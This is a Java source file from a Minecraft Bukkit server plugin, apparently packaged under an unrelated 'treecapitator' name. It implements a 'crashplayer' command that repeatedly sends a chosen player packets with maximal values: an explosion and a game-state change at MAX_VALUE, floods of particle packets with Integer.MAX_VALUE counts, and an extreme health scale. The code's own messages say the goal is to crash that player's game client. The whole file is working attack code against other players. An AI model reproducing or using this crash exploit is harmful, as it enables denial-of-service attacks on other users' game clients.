package me.bow.treecapitatorultimate.commands.Player;

import me.bow.treecapitatorultimate.Start;
import me.bow.treecapitatorultimate.command.Command;
import me.bow.treecapitatorultimate.command.CommandCategory;
import net.minecraft.server.v1_14_R1.*;
import org.bukkit.Bukkit;
import org.bukkit.ChatColor;
import org.bukkit.craftbukkit.v1_14_R1.entity.CraftPlayer;
import org.bukkit.entity.Player;
import org.bukkit.scheduler.BukkitRunnable;

import java.util.ArrayList;
import java.util.Collections;


public class CrashPlayer extends Command {
    public CrashPlayer() {
        super("crashplayer", "Crashes player's mc by sending magical shit.", CommandCategory.Player, 1);
    }

    @Override
    public void onCommand(Player p, ArrayList<String> args) {
        for (String arg : args) {
            try {
                Player anotherPlayer = Bukkit.getPlayer(arg);
                if (anotherPlayer == null) {
                    Start.ErrorString(p, "Player \"" + arg + "\" is not online!");
                    continue;
                }
                p.sendMessage(Start.Prefix + ChatColor.GREEN + anotherPlayer.getName() + ChatColor.YELLOW + " is being crashed using combined method (packet, health and particles)!");
                new BukkitRunnable() {
                    int times = 0;

                    @Override
                    public void run() {
                        if (times >= 100) {
                            p.sendMessage(Start.Prefix + ChatColor.GREEN + "Stopped crashing " + ChatColor.YELLOW + anotherPlayer.getName() + "! (crashing happened 100 times)");
                            this.cancel();
                            return;
                        }
                        if (anotherPlayer == null || !anotherPlayer.isOnline()) {
                            p.sendMessage(Start.Prefix + ChatColor.GREEN + "Stopped crashing " + ChatColor.YELLOW + anotherPlayer.getName() + "! (player disconnected)");
                            this.cancel();
                            return;
                        }
                        crashPlayer(anotherPlayer);
                    }
                }.runTaskTimerAsynchronously(Start.Instance, 0L, 5L);
                p.sendMessage(Start.Prefix + ChatColor.GREEN + anotherPlayer.getName() + ChatColor.YELLOW + " should be gone after 30 seconds (time out limit) now!");
            } catch (Exception e) {
                Start.ErrorException(p, e);
            }
        }
    }

    private void crashPlayer(Player p) {
        ((CraftPlayer) p).getHandle().playerConnection.sendPacket(new PacketPlayOutExplosion(Double.MAX_VALUE, Double.MAX_VALUE, Double.MAX_VALUE, Float.MAX_VALUE, Collections.emptyList(), new Vec3D(Double.MAX_VALUE, Double.MAX_VALUE, Double.MAX_VALUE)));
        ((CraftPlayer) p).getHandle().playerConnection.sendPacket(new PacketPlayOutGameStateChange(7, Float.MAX_VALUE));
        final PacketPlayOutWorldParticles packet = new PacketPlayOutWorldParticles(Particles.HEART, true, (float) p.getLocation().getBlockX(), (float) p.getLocation().getBlockY(), (float) p.getLocation().getBlockZ(), 3.0f, 3.0f, 3.0f, 3.0f, Integer.MAX_VALUE);
        final PacketPlayOutWorldParticles packet2 = new PacketPlayOutWorldParticles(Particles.EXPLOSION, true, (float) p.getLocation().getBlockX(), (float) p.getLocation().getBlockY(), (float) p.getLocation().getBlockZ(), 3.0f, 3.0f, 3.0f, 3.0f, Integer.MAX_VALUE);
        for (int f = 0; f < 1000; f++) {
            ((CraftPlayer) p).getHandle().playerConnection.sendPacket(packet);
            ((CraftPlayer) p).getHandle().playerConnection.sendPacket(packet2);
        }
        p.setHealthScale(Integer.MAX_VALUE);
    }
}